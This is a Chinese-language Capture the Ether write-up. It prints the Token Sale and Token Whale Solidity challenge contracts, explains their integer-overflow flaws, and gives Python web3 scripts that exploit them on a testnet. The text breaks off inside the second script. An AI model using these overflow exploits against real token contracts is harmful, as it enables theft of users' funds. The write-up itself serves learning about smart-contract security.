<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenSaleChallenge &#123;</span><br><span class="line">    mapping(address &#x3D;&gt; uint256) public balanceOf;</span><br><span class="line">    uint256 constant PRICE_PER_TOKEN &#x3D; 1 ether;</span><br><span class="line"></span><br><span class="line">    function TokenSaleChallenge(address _player) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &lt; 1 ether;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy(uint256 numTokens) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; numTokens * PRICE_PER_TOKEN);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] +&#x3D; numTokens;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sell(uint256 numTokens) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;&#x3D; numTokens);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] -&#x3D; numTokens;</span><br><span class="line">        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=tgIqecROs5M"><del>Sale</del> Sail</a>.</p>
<p><strong>解题：</strong></p>
<p><code>buy</code> 函数中的乘法存在溢出， 因此我们可以低买高卖 。 此处的msg.value是以ether为单位，因为一个PRICE_PRE_TOKEN就是1 ether，这里我们需要明白在以太坊里最小的单位是wei，所以此处的1 ether事实上也就是10^18 wei，即其值的大小为10^18 wei，这样就满足我们溢出的条件了，因为以太坊处理数据是以256位为单位，我们传入一个较大的numTokens，乘法运算溢出后所需的mag.value就非常小了， 直接利用 Python 脚本解决这个题目。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> timeout</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3 ,HTTPProvider</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">challenge_addr = <span class="string">&quot;0x0e27e17Ab06db38134825299a2bA0A3749Ea810c&quot;</span></span><br><span class="line">wallet_addr = <span class="string">&quot;0x5b667caAC1E53411D9b87Fc39eEe2F881FDDF589&quot;</span></span><br><span class="line">wallet_private_key = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">challenge_api = <span class="string">&#x27;&#x27;&#x27;[</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;name&quot;: &quot;balanceOf&quot;,</span></span><br><span class="line"><span class="string">		&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">	&#125;,</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">		&quot;name&quot;: &quot;isComplete&quot;,</span></span><br><span class="line"><span class="string">		&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;bool&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">	&#125;,</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;numTokens&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;name&quot;: &quot;buy&quot;,</span></span><br><span class="line"><span class="string">		&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: true,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;payable&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">	&#125;,</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;numTokens&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;name&quot;: &quot;sell&quot;,</span></span><br><span class="line"><span class="string">		&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">	&#125;,</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: true,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;payable&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;constructor&quot;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">w3 = Web3(HTTPProvider(<span class="string">&quot;https://ropsten.infura.io/v3/[key]&quot;</span>))</span><br><span class="line"></span><br><span class="line">contract = w3.eth.contract(address = challenge_addr, abi = json.loads(challenge_api))</span><br><span class="line">acct = w3.eth.account.from_key(wallet_private_key)</span><br><span class="line"></span><br><span class="line">min_token_number_with_overflow = <span class="number">2</span> ** <span class="number">256</span> // <span class="number">10</span> ** <span class="number">18</span> + <span class="number">1</span></span><br><span class="line">value = (min_token_number_with_overflow * <span class="number">10</span> ** <span class="number">18</span>) % <span class="number">2</span> ** <span class="number">256</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[*] Buying ...&quot;</span>)</span><br><span class="line"></span><br><span class="line">tx = contract.functions.buy(min_token_number_with_overflow).buildTransaction(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;value&#x27;</span> : value,</span><br><span class="line">        <span class="string">&#x27;gas&#x27;</span> : <span class="number">3000000</span>,</span><br><span class="line">        <span class="string">&quot;nonce&quot;</span>: w3.eth.getTransactionCount(acct.address) ,</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">signed = acct.signTransaction(tx)</span><br><span class="line">tx_id = w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line">receipt = w3.eth.wait_for_transaction_receipt(tx_id, timeout = <span class="number">300</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> receipt[<span class="string">&#x27;status&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">&quot;[+] Bought!&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;[*] Selling ...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    tx = contract.functions.sell(<span class="number">1</span>).buildTransaction(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&#x27;gas&#x27;</span> : <span class="number">3000000</span>,</span><br><span class="line">            <span class="string">&quot;nonce&quot;</span>: w3.eth.getTransactionCount(acct.address) ,</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">    signed = acct.signTransaction(tx)</span><br><span class="line">    tx_id = w3.eth.sendRawTransaction(signed.rawTransaction)</span><br><span class="line">    receipt = w3.eth.wait_for_transaction_receipt(tx_id, timeout = <span class="number">300</span>)</span><br><span class="line">    <span class="keyword">if</span> receipt[<span class="string">&#x27;status&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">&quot;[+] Sold!&quot;</span>)</span><br><span class="line">        print(contract.functions.isComplete().call())</span><br><span class="line">        print(<span class="string">&#x27;[+] Solved&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-Token-whale"><a href="#2-Token-whale" class="headerlink" title="2. Token whale"></a>2. Token whale</h3><p><strong>题目描述：</strong></p>
<p>This ERC20-compatible token is hard to acquire. There’s a fixed supply of 1,000 tokens, all of which are yours to start with.</p>
<p>Find a way to accumulate at least 1,000,000 tokens to solve this challenge.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenWhaleChallenge &#123;</span><br><span class="line">    address player;</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line">    mapping(address &#x3D;&gt; uint256) public balanceOf;</span><br><span class="line">    mapping(address &#x3D;&gt; mapping(address &#x3D;&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    string public name &#x3D; &quot;Simple ERC20 Token&quot;;</span><br><span class="line">    string public symbol &#x3D; &quot;SET&quot;;</span><br><span class="line">    uint8 public decimals &#x3D; 18;</span><br><span class="line"></span><br><span class="line">    function TokenWhaleChallenge(address _player) public &#123;</span><br><span class="line">        player &#x3D; _player;</span><br><span class="line">        totalSupply &#x3D; 1000;</span><br><span class="line">        balanceOf[player] &#x3D; 1000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return balanceOf[player] &gt;&#x3D; 1000000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    function _transfer(address to, uint256 value) internal &#123;</span><br><span class="line">        balanceOf[msg.sender] -&#x3D; value;</span><br><span class="line">        balanceOf[to] +&#x3D; value;</span><br><span class="line"></span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;&#x3D; value);</span><br><span class="line">        require(balanceOf[to] + value &gt;&#x3D; balanceOf[to]);</span><br><span class="line"></span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 value) public &#123;</span><br><span class="line">        allowance[msg.sender][spender] &#x3D; value;</span><br><span class="line">        emit Approval(msg.sender, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 value) public &#123;</span><br><span class="line">        require(balanceOf[from] &gt;&#x3D; value);</span><br><span class="line">        require(balanceOf[to] + value &gt;&#x3D; balanceOf[to]);</span><br><span class="line">        require(allowance[from][msg.sender] &gt;&#x3D; value);</span><br><span class="line"></span><br><span class="line">        allowance[from][msg.sender] -&#x3D; value;</span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Enjoy this inspirational music while you work: <a href="https://www.youtube.com/watch?v=cvcA8truev4">Tough Decisions</a>.</p>
<p><strong>解题：</strong></p>
<p>初始账户有 1000 个token， 题目要求我们获取到 1000000 token 。 主要交易函数有两个: <code>transfer</code>  以及<code>transferFrom</code> , 这两个函数最后都调用了 <code>_transfer</code>  。通过简单审计我们发现， <code>_transfer</code>  中的 <code>balanceOf[msg.sender] -= value;</code>  是存在溢出的 。 另外我们注意到 <code>transferFrom</code> 进行了大小检， 但是检查的是 <code>balanceOf[from] &gt;= value</code> , 但实际扣款的是  msg.sender , 因此此处存在漏洞风险。</p>
<p>利用思路：</p>
<ol>
<li>准备需要两个账户 （通过 metamask 新建一个账户即可 ）</li>
<li>通过 <code>transfer</code>  向新建的账户转 balance， 多转点， 让新账户的 balance 多于主账户的即可</li>
<li>调用 <code>approve</code>  设置 <code>allowance</code> ,  <code>spender</code> 为主账户，<code>value</code> 为大于后面要转的值即可 ，例如设置为 1000</li>
<li>最后调用 <code>transferFrom</code> 函数 <code>from</code>  设置为账号 2， <code>to</code>  设置为非主账户即可， 转入一个值让其溢出即可。 </li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3 ,HTTPProvider</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> log</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">challenge_addr = <span class="string">&quot;0xDC57892A1058d1e54c9364Ba726BB7643bdA6b2C&quot;</span></span><br><span class="line"></span><br><span class="line">MasterWalt = <span class="string">&quot;0x5b667caAC1E53411D9b87Fc39eEe2F881FDDF589&quot;</span></span><br><span class="line">MasterPrivKey  = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">HelpWalt = <span class="string">&quot;0x0cC33CD693bf9BF609e1B7C0E88E34Ff972Afe6f&quot;</span></span><br><span class="line">HelpPrivKey = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">challenge_api = <span class="string">&#x27;&#x27;&#x27;[</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">		&quot;name&quot;: &quot;name&quot;,</span></span><br><span class="line"><span class="string">		&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;string&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">	&#125;,</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;spender&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">			&#125;,</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;value&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;name&quot;: &quot;approve&quot;,</span></span><br><span class="line"><span class="string">		&quot;outputs&quot;: [],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;nonpayable&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">	&#125;,</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;constant&quot;: true,</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [],</span></span><br><span class="line"><span class="string">		&quot;name&quot;: &quot;totalSupply&quot;,</span></span><br><span class="line"><span class="string">		&quot;outputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;uint256&quot;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		],</span></span><br><span class="line"><span class="string">		&quot;payable&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;stateMutability&quot;: &quot;view&quot;,</span></span><br><span class="line"><span class="string">		&quot;type&quot;: &quot;function&quot;</span></span><br><span class="line"><span class="string">	&#125;,</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		&quot;constant&quot;: false,</span></span><br><span class="line"><span class="string">		&quot;inputs&quot;: [</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;from&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">			&#125;,</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span class="line"><span class="string">				&quot;name&quot;: &quot;to&quot;,</span></span><br><span class="line"><span class="string">				&quot;type&quot;: &quot;address&quot;</span></span><br><span class="line"><span class="string">			&#125;,</span></span><br><span class="line"><span class="string">			&#123;</span></span><br><span 